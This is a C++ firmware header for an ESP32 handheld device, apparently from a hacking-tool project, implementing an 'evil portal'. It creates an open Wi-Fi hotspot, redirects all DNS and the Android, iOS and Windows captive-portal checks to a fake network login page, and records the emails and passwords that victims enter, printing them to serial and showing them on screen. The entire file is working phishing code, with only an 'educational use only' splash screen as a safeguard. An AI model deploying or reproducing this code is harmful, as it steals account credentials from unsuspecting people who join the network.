// ═══════════════════════════════════════════════════════════
// COMPANION OS v7.0 — DR. HACK: EVIL PORTAL
// Captive portal with credential capture
// Adapted from ESP32-TOOLS-PRO for 160×128 ST7735R
// ═══════════════════════════════════════════════════════════
#ifndef DH_EVIL_PORTAL_H
#define DH_EVIL_PORTAL_H

#ifdef ESP32

#include "globals.h"
#include "ui_components.h"
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// ═══════════════════════════════════════════════════════════
// HTML CONTENT — Served to captive portal clients
// ═══════════════════════════════════════════════════════════

static const char DH_PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Network Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,system-ui,sans-serif;background:#1a1a2e;
color:#eee;display:flex;align-items:center;justify-content:center;
min-height:100vh}
.card{background:#16213e;border-radius:16px;padding:32px;
width:90%;max-width:380px;box-shadow:0 8px 32px rgba(0,0,0,0.4)}
h2{text-align:center;margin-bottom:24px;color:#e94560}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #0f3460;
border-radius:8px;background:#1a1a2e;color:#fff;font-size:14px}
input:focus{outline:none;border-color:#e94560}
button{width:100%;padding:12px;margin-top:16px;border:none;
border-radius:8px;background:linear-gradient(135deg,#e94560,#0f3460);
color:#fff;font-size:16px;cursor:pointer;font-weight:600}
button:hover{opacity:0.9}
.info{text-align:center;color:#777;font-size:11px;margin-top:16px}
</style>
</head>
<body>
<div class="card">
<h2>WiFi Network Login</h2>
<form action="/capture" method="POST">
<input name="email" placeholder="Email / Username" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form>
<p class="info">By connecting you agree to the Terms of Service.</p>
</div>
</body>
</html>
)rawliteral";

static const char DH_PORTAL_DONE[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Connected</title>
<style>body{background:#1a1a2e;color:#eee;display:flex;align-items:center;
justify-content:center;min-height:100vh;font-family:sans-serif}
.msg{text-align:center}</style></head>
<body><div class="msg"><h2>Connected!</h2>
<p>Please wait while we configure your connection...</p>
</div></body></html>
)rawliteral";

// ═══════════════════════════════════════════════════════════
// STATE
// ═══════════════════════════════════════════════════════════

#define DH_EP_MAX_CREDS 20

struct DH_Credential {
  String email;
  String password;
};

static DH_Credential dhEpCreds[DH_EP_MAX_CREDS];
static int dhEpCredCount = 0;
static int dhEpClients = 0;
static bool dhEpRunning = false;

static WebServer* dhEpServer = nullptr;
static DNSServer* dhEpDns = nullptr;

// ═══════════════════════════════════════════════════════════
// HANDLERS
// ═══════════════════════════════════════════════════════════

static void dhEpHandleRoot() {
  dhEpServer->send(200, "text/html", DH_PORTAL_HTML);
}

static void dhEpHandleCapture() {
  String email = dhEpServer->arg("email");
  String pass = dhEpServer->arg("password");

  if (dhEpCredCount < DH_EP_MAX_CREDS) {
    dhEpCreds[dhEpCredCount].email = email;
    dhEpCreds[dhEpCredCount].password = pass;
    dhEpCredCount++;
  }

  Serial.printf("[EvilPortal] Captured: %s / %s\n", email.c_str(), pass.c_str());
  dhEpServer->send(200, "text/html", DH_PORTAL_DONE);
}

static void dhEpHandleNotFound() {
  dhEpServer->sendHeader("Location", "/", true);
  dhEpServer->send(302, "text/plain", "");
}

// ═══════════════════════════════════════════════════════════
// UI
// ═══════════════════════════════════════════════════════════

static void dhEpDrawStatus() {
  tft.fillScreen(CLR_BG);
  tft.drawRect(0, 0, SCR_W, SCR_H, CLR_SECONDARY);
  drawGradientCard(2, 2, SCR_W-4, SCALE_Y(14), CLR_SECONDARY, darkenColor(CLR_SECONDARY, 50), 0);
  tft.setTextColor(CLR_TEXT_HI);
  tft.drawString("EVIL PORTAL", SCALE_X(4), SCALE_Y(3), 1);

  int y = SCALE_Y(22);
  tft.setTextColor(CLR_SUCCESS);
  tft.drawString("[ACTIVE]", SCALE_X(4), y, 1); y += SCALE_Y(14);

  tft.setTextColor(CLR_TEXT_MED);
  tft.drawString("AP: CompanionOS-Free", SCALE_X(4), y, 1); y += SCALE_Y(12);

  char buf[32];
  tft.setTextColor(CLR_TEXT_MED);
  tft.drawString("IP: 192.168.4.1", SCALE_X(4), y, 1); y += SCALE_Y(14);

  dhEpClients = WiFi.softAPgetStationNum();
  sprintf(buf, "Clients: %d", dhEpClients);
  tft.setTextColor(CLR_PRIMARY);
  tft.drawString(buf, SCALE_X(4), y, 1); y += SCALE_Y(14);

  sprintf(buf, "Creds captured: %d", dhEpCredCount);
  tft.setTextColor(dhEpCredCount > 0 ? CLR_SUCCESS : CLR_WARNING);
  tft.drawString(buf, SCALE_X(4), y, 1); y += SCALE_Y(14);

  // Show last captured credential
  if (dhEpCredCount > 0) {
    drawSeparator(SCALE_X(4), y, SCR_W - SCALE_X(8), CLR_BORDER);
    y += SCALE_Y(6);
    tft.setTextColor(CLR_TEXT_LO);
    tft.drawString("Last:", SCALE_X(4), y, 1); y += SCALE_Y(10);
    tft.setTextColor(CLR_WARNING);
    drawTruncatedText(SCALE_X(4), y, dhEpCreds[dhEpCredCount-1].email.c_str(),
                      SCR_W - SCALE_X(8), CLR_WARNING, 1);
  }

  // Activity bar
  int barW = random(10, SCR_W - SCALE_X(8));
  tft.fillRect(SCALE_X(4), SCR_H - SCALE_Y(20), SCR_W - SCALE_X(8), SCALE_Y(3), CLR_SURFACE);
  tft.fillRect(SCALE_X(4), SCR_H - SCALE_Y(20), barW, SCALE_Y(3), CLR_SECONDARY);

  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("HOLD SEL: stop", SCALE_X(4), SCR_H - SCALE_Y(10), 1);
}

// ═══════════════════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════════════════

static void dhRunEvilPortal() {
  // Disclaimer
  tft.fillScreen(CLR_BG);
  tft.drawRect(0, 0, SCR_W, SCR_H, CLR_SECONDARY);
  tft.setTextColor(CLR_SECONDARY);
  tft.drawCentreString("EVIL PORTAL", SCR_CX, SCALE_Y(8), 1);
  tft.setTextColor(CLR_TEXT_MED);
  tft.drawCentreString("Captive portal", SCR_CX, SCALE_Y(30), 1);
  tft.drawCentreString("credential capture", SCR_CX, SCALE_Y(42), 1);
  tft.setTextColor(CLR_WARNING);
  tft.drawCentreString("EDUCATIONAL USE", SCR_CX, SCALE_Y(60), 1);
  tft.drawCentreString("ONLY!", SCR_CX, SCALE_Y(72), 1);
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("SEL:Accept <:Cancel", SCALE_X(2), SCR_H - SCALE_Y(12), 1);

  while (true) {
    extern void handleNetwork(); handleNetwork();
    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) { delay(200); break; }
    if ((digitalRead(BTN_LEFT) == LOW || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) { delay(200); return; }
    delay(20);
  }

  // Setup AP
  dhEpCredCount = 0;
  WiFi.mode(WIFI_AP);
  WiFi.softAP("CompanionOS-Free", "");
  delay(200);

  // DNS server: redirect all domains to portal IP
  dhEpDns = new DNSServer();
  dhEpDns->start(53, "*", WiFi.softAPIP());

  // Web server
  dhEpServer = new WebServer(80);
  dhEpServer->on("/", HTTP_GET, dhEpHandleRoot);
  dhEpServer->on("/capture", HTTP_POST, dhEpHandleCapture);
  dhEpServer->on("/generate_204", HTTP_GET, dhEpHandleRoot);   // Android captive check
  dhEpServer->on("/hotspot-detect.html", HTTP_GET, dhEpHandleRoot); // iOS captive check
  dhEpServer->on("/connecttest.txt", HTTP_GET, dhEpHandleRoot); // Windows captive check
  dhEpServer->onNotFound(dhEpHandleNotFound);
  dhEpServer->begin();
  dhEpRunning = true;

  unsigned long lastDraw = 0;
  unsigned long holdStart = 0; bool holding = false;

  while (true) {
    extern void handleNetwork(); handleNetwork();
    dhEpDns->processNextRequest();
    dhEpServer->handleClient();

    if (millis() - lastDraw > 500) {
      dhEpDrawStatus();
      lastDraw = millis();
    }

    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 800) break;
    } else { holding = false; }

    yield();
    delay(5);
  }

  // Cleanup
  dhEpServer->stop();
  delete dhEpServer; dhEpServer = nullptr;
  dhEpDns->stop();
  delete dhEpDns; dhEpDns = nullptr;
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  dhEpRunning = false;
  delay(100);
}

#endif // ESP32
#endif // DH_EVIL_PORTAL_H
